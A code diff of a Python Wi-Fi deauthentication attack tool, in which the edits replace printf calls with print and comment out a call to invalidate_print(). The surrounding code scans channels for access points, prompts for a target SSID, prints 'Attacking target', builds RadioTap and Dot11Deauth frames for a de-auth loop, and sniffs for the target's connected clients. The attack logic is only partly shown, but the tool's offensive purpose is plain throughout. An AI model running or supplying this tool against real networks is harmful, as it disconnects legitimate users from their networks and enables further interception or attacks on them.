@@ -53,7 +53,7 @@ class Interceptor:
         self._current_channel_num = ch_num
 
     def _print_channel(self):
-        printf(f"[*] Scanning for APs, current channel -> {self._current_channel_num}")
+        print(f"[*] Scanning for APs, current channel -> {self._current_channel_num}")
 
     def _ap_sniff_cb(self, pkt):
         try:
@@ -66,7 +66,7 @@ class Interceptor:
                     if "ef:12" in ap_mac:
                         pkt.show()
                     self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
-                    printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
+                    print(f"[+] Found {ssid} on channel {self._current_channel_num}...")
                 c_mac = pkt.addr1
                 if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
                     # todo check type of pkt instead
@@ -85,7 +85,7 @@ class Interceptor:
             return
 
     def _start_initial_ap_scan(self):
-        printf("[*] Starting AP scan, please wait... (11 channels total)")
+        print("[*] Starting AP scan, please wait... (11 channels total)")
 
         self._scan_channels_for_aps()
 
@@ -101,20 +101,20 @@ class Interceptor:
 
         ctr = 0
         target_map = dict()
-        printf(DELIM)
+        print(DELIM)
         for ssid, ssid_stats in self._active_aps.items():
             ctr += 1
             target_map[ctr] = ssid
             pref = f"[{ctr}] "
-            printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
+            print(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
         if not target_map:
-            printf("[!] Not APs were found, quitting...")
+            print("[!] Not APs were found, quitting...")
             self._abort = True
             exit(0)
 
         chosen = -1
         while chosen not in target_map.keys():
-            printf(f"[>] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
+            print(f"[>] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
             chosen = int(input())
 
         return target_map[chosen]
@@ -129,19 +129,19 @@ class Interceptor:
                 if ssid == self.target_ssid:
                     c_mac = pkt.addr1
                     if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
-                        printf(c_mac + " c vs ap" + self._active_aps[self.target_ssid]["mac_addr"])
-                        printf(str(self._active_aps[self.target_ssid]["clients"]))
+                        print(c_mac + " c vs ap" + self._active_aps[self.target_ssid]["mac_addr"])
+                        print(str(self._active_aps[self.target_ssid]["clients"]))
                         # todo check type of pkt instead
                         self._active_aps[ssid]["clients"].append(c_mac)
         except:
             pass
 
     def _listen_for_clients(self):
-        printf(f"[*] Setting up a listener for new clients...")
+        print(f"[*] Setting up a listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
 
     def _run_deauther(self):
-        printf(f"[*] Starting de-auth loop...")
+        print(f"[*] Starting de-auth loop...")
 
         rd_frm = RadioTap()
         deauth_frm = Dot11Deauth()
@@ -161,24 +161,24 @@ class Interceptor:
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
-        printf(f"[*] Attacking target {self.target_ssid}")
-        printf(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
+        print(f"[*] Attacking target {self.target_ssid}")
+        print(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
         self._set_channel(self._active_aps[self.target_ssid]["channel"])
 
         for action in [self._run_deauther, self._listen_for_clients]:
             t = Thread(target=action, args=tuple(), daemon=True)
             t.start()
 
-        printf(DELIM)
-        printf("")
+        print(DELIM)
+        print("")
         try:
             while not self._abort:
-                printf(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
-                printf(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
-                printf(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
-                printf(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
-                printf(f"[*] Num of clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
-                printf(f"[*] Current time {str(int(time.time())).rjust(80 - 17, ' ')}")
+                print(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
+                print(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
+                print(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
+                print(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
+                print(f"[*] Num of clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
+                print(f"[*] Current time {str(int(time.time())).rjust(80 - 17, ' ')}")
                 sleep(self._print_res_intv)
                 clear_line(7)
         except KeyboardInterrupt:
@@ -215,6 +215,6 @@ if __name__ == "__main__":
                         dest="net_iface", metavar="network_interface", required=True)
     pargs = parser.parse_args()
 
-    invalidate_print()  # after arg parsing
+    # invalidate_print()  # after arg parsing
     attacker = Interceptor(net_iface=pargs.net_iface)
     attacker.run()
